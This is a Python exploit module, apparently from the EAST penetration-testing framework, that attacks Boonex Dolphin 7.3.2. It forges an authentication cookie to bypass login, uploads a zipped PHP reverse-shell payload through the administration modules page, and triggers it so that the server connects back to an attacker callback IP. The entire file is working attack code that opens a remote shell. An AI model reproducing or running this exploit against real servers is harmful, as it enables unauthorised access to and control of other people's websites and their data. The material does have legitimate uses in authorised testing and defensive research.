#! /usr/bin/env python
# -*- coding: utf_8 -*-
# The exploit is a part of EAST Framework - use only under the license agreement specified in LICENSE.txt in your EAST Framework distribution

import sys
import os
import ssl
import time
import socket
import urllib2
from zipfile import ZipFile
from collections import OrderedDict

sys.path.append('./core')
sys.path.append('./shellcodes')
import ShellUtils
import Shellcodes
from Sploit import Sploit

INFO = {}
INFO['NAME'] = "efa_boonex_dolphin_fu_rce"
INFO['DESCRIPTION'] = "Boonex Dolphin 7.3.2 - Authentication Bypass / Remote Code Execution"
INFO['VENDOR'] = "https://www.boonex.com"
INFO['DOWNLOAD_LINK'] = 'https://www.exploit-db.com/apps/68e067a11c9e1220f41d208282074322-Dolphin-v.7.3.2.zip'
INFO['LINKS'] = ['https://www.exploit-db.com/exploits/40756/']
INFO["CVE Name"] = "?"
INFO["NOTES"] = """An unauthenticated user can upload evil php file to tmp directory
"""

INFO['CHANGELOG'] = "15 Nov, 2016. Written by Gleg team."
INFO['PATH'] = 'Exploits/Web/'

# Must be in every module, to be set by framework
OPTIONS = OrderedDict()
OPTIONS["HOST"] = "192.168.1.207", dict(description = 'Target IP')
OPTIONS["PORT"] = 80, dict(description = 'Target port')
OPTIONS["BASEPATH"] = '/Dolphin', dict(description = 'Basepath of Boonex Dolphin')
OPTIONS["CALLBACK_IP"] = "192.168.1.49", dict(description = 'Callback IP')

class exploit(Sploit):
    def __init__(self, host = "", port = 0, logger = None):
        Sploit.__init__(self, logger = logger)
        self.name = INFO['NAME']
        self.host = host
        self.port = port
        self.basepath = OPTIONS["BASEPATH"]
        self.callback_ip = ''
        
    def args(self):
        self.args = Sploit.args(self, OPTIONS)
        self.host = self.args.get('HOST', self.host)
        self.port = int(self.args.get('PORT', self.port))
        self.basepath = self.args.get('BASEPATH', self.basepath)
        self.callback_ip = self.args.get('CALLBACK_IP', OPTIONS["CALLBACK_IP"])
    
    def make_url(self, path = ''):
        return 'http://{}:{}{}{}'.format(self.host, self.port, self.basepath, path)
    
    def make_sploit(self):
        self.log("[>] Generate shellcode started")
        
        if self.args['listener']:
            port = self.args['listener']['PORT']
        else:
            return None

        s = Shellcodes.CrossOSShellcodes(self.callback_ip, port)
        shellcode = s.create_shellcode(ShellUtils.Constants.ShellcodeType.PHP, True)

        self.log("[>] Shellcode ready")
        return shellcode
    
    def make_data(self, payload):
        data = ''
        data += '--o0oOo0o\r\n'
        data += 'Content-Disposition: form-data; name="submit_upload"\r\n\r\n'
        data += 'shell\r\n'
        data += '--o0oOo0o\r\n'
        data += 'Content-Disposition: form-data; name="csrf_token"\r\n\r\n'
        data += 'CSRF TOKEN\r\n'
        data += '--o0oOo0o\r\n'
        data += 'Content-Disposition: form-data; name="module"; filename="shell.zip"\r\n'
        data += 'Content-Type: application/zip\r\n\r\n'
        data += payload
        data += '\r\n--o0oOo0o--\r\n'
        return data
    
    def run(self):
        self.args()
        self.log("Attacking {}".format(self.host))
            
        if self.is_listener_connected() is None:
            self.log('Please, enable listener to use this module')
            self.finish(False)
            
        php = self.make_sploit()[1:]
        with ZipFile('shell.zip', 'w') as fd:
            fd.writestr('shell.php', php)
        with open('shell.zip', 'rb') as fd:
            zip_php = fd.read()
        os.remove('shell.zip')    
        
        data = self.make_data(zip_php)
        
        request = urllib2.Request(self.make_url('/administration/modules.php'), data)
        request.add_header('Content-Length', len(data))
        request.add_header('Content-Type', 'multipart/form-data; boundary=o0oOo0o')
        request.add_header('Cookie', 'memberID=1; memberPassword[]=shell;')
        request.add_header('Referer', self.make_url('/administration/modules.php'))
        
        try:
            fd = urllib2.urlopen(request, context=ssl.SSLContext(ssl.PROTOCOL_TLSv1))
        except Exception as e:
            self.log(e)
            self.finish(False)
        self.log('Upload successful!')
        
        try:
            fd = urllib2.urlopen(self.make_url('/tmp/shell.php'), timeout=3)
        except socket.timeout:
            pass
        while True:
            if self.is_listener_connected():
                break
            time.sleep(3)
        self.finish(True)
        
if __name__ == '__main__':
    """
        By now we only have the tool mode for exploit..
        Later we would have standalone mode also.
    """

    print "Running exploit %s .. " % INFO['NAME']
    e = exploit('', 80)
    e.run()
